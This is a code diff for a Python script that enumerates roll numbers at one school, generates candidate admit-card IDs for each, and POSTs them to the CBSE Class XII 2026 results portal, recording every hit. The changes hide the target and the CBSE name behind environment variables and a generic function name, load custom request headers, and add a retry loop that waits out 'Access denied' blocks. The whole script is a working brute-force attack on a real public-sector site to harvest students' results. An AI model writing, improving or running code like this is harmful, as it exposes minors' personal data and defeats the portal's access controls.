@@ -3,20 +3,26 @@ import string
 import csv
 import os
 import time
+from dotenv import load_dotenv
+import json
+
+load_dotenv()
 
 # =========================
 # CONFIG
 # =========================
 
-URL = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii_2026.asp"
+URL = os.getenv("URL")
+SCHOOL_NO = os.getenv("SCHOOL_NO")
+RESULTS_CSV = os.getenv("RESULTS_CSV")
+PROGRESS_FILE = os.getenv("PROGRESS_FILE")
+HEADERS = json.loads(os.getenv("HEADERS"))
+START_ROLL = int(os.getenv("START_ROLL"))
+END_ROLL = int(os.getenv("END_ROLL"))
 
-SCHOOL_NO =
-
-START_ROLL =
-END_ROLL =
-
-RESULTS_CSV = "valid_results.csv"
-PROGRESS_FILE = "progress.txt"
+required = [URL, SCHOOL_NO, RESULTS_CSV, PROGRESS_FILE]
+if not all(required):
+    raise ValueError("Missing environment variables")
 
 # =========================
 # SESSION
@@ -24,14 +30,12 @@ PROGRESS_FILE = "progress.txt"
 
 session = requests.Session()
 
-session.headers.update({"User-Agent": "Mozilla/5.0"})
-
 # =========================
 # GENERATOR
 # =========================
 
 
-def generate_cbse_ids(roll_no, school_code):
+def generate_ids(roll_no, school_code):
 
     roll_no = str(roll_no)
     school_code = str(school_code)
@@ -106,7 +110,7 @@ for current_roll in range(resume_roll, END_ROLL + 1):
 
     found = False
 
-    generator = generate_cbse_ids(current_roll, SCHOOL_NO)
+    generator = generate_ids(current_roll, SCHOOL_NO)
 
     for index, admit_card_id in enumerate(generator):
 
@@ -124,14 +128,18 @@ for current_roll in range(resume_roll, END_ROLL + 1):
                 "sch": SCHOOL_NO,
                 "admid": admit_card_id,
             }
-
-            response = session.post(URL, data=payload, timeout=10)
+            response = session.post(URL, data=payload, headers=HEADERS)
 
             html = response.text
 
+            if "Access denied" in html:
+                print("[BLOCKED]")
+                time.sleep(60)
+                continue
+
             # FAILURE CHECK
 
-            if "f{current_roll}" in html:
+            if f"{current_roll}" in html:
 
                 print(f"[FOUND] {current_roll} -> {admit_card_id}")
 
